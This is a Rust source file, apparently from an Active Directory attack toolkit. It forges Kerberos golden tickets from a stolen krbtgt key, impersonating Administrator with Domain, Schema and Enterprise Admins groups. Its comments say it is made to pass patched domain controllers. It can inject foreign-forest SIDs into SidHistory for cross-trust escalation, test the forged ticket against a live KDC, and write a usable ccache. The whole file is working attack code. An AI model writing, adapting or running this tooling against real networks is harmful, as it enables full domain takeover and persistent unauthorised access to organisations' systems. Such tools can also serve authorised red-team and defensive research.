//! Golden ticket: forge a TGT for any identity with the krbtgt AES256 key.
//! Sealed + double-signed so fully-patched (KB5020805) KDCs still accept it.

use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct GoldenArgs {
    /// KDC host or IP.
    #[arg(long)]
    pub kdc: String,
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    pub realm: String,
    /// krbtgt key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
    #[arg(long)]
    pub krbtgt_aes256: String,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the krbtgt NT hash (legacy DCs).
    #[arg(long)]
    pub rc4: bool,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    pub domain_sid: String,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    pub user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    pub rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    pub groups: Vec<u32>,
    /// Write the forged TGT to this ccache path.
    #[arg(long)]
    pub out: Option<String>,
    /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
    #[arg(long)]
    pub verify_spn: Option<String>,
    /// Foreign-forest SID(s) to inject into the PAC's SidHistory (ExtraSids field).
    /// Format: full S-1-5-21-...-RID SID string. Repeat --foreign-sid or comma-separate for
    /// multiple. On a trusting forest with SID filtering disabled (or misconfigured — e.g.
    /// intra-forest child-domain trust where SIDHistory is NOT filtered), the KDC authorizes
    /// as the injected principal without needing that forest's krbtgt.
    #[arg(long, value_delimiter = ',')]
    pub foreign_sid: Vec<String>,
}

/// Golden ticket: forge a TGT for an arbitrary identity, sealed + double-signed with the domain's
/// krbtgt AES256 key. Accepted by fully-patched (KB5020805) KDCs because the forged PAC carries a
/// valid KDC signature plus PAC_REQUESTOR/PAC_ATTRIBUTES.
pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let key = crate::parse_forge_key(&a.krbtgt_aes256, a.rc4)?;
    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;

    // Parse --foreign-sid values into sub-authority chains for the PAC's ExtraSids.
    // Only identifier authority 5 (NT_AUTHORITY) is meaningful in KERB_VALIDATION_INFO
    // ExtraSids — anything else is nonsense in an AD trust context.
    let mut extras: Vec<Vec<u32>> = Vec::with_capacity(a.foreign_sid.len());
    for sid_str in &a.foreign_sid {
        let sid = adhammer_core::sid::Sid::parse(sid_str).ok_or_else(|| {
            anyhow::anyhow!("--foreign-sid {sid_str:?} is not a valid SID (want S-1-5-21-...-RID)")
        })?;
        if sid.identifier_authority != 5 {
            anyhow::bail!(
                "--foreign-sid {sid_str} has identifier authority {} != 5; ExtraSids only \
                 accepts NT_AUTHORITY (S-1-5-...) forest/domain SIDs",
                sid.identifier_authority
            );
        }
        extras.push(sid.sub_authorities.clone());
    }

    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
        extra_sids: extras,
    };
    if !a.foreign_sid.is_empty() {
        println!(
            "[+] injecting {} foreign SID(s) into PAC ExtraSids:",
            a.foreign_sid.len()
        );
        for s in &a.foreign_sid {
            println!("    {s}");
        }
    }
    let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
    println!(
        "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
        a.user, a.realm, a.rid, a.groups
    );

    if let Some(spn) = &a.verify_spn {
        match adhammer_kerberos::roast_spn(&tgt, &a.user, spn, &a.kdc).await {
            Ok(_) => println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})"),
            Err(e) => println!("[-] KDC rejected the golden ticket for {spn}: {e}"),
        }
    }
    if let Some(out) = &a.out {
        let cc = adhammer_kerberos::golden_ccache(&tgt, &a.user)?;
        std::fs::write(out, &cc)?;
        println!(
            "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
            cc.len()
        );
    }
    Ok(())
}
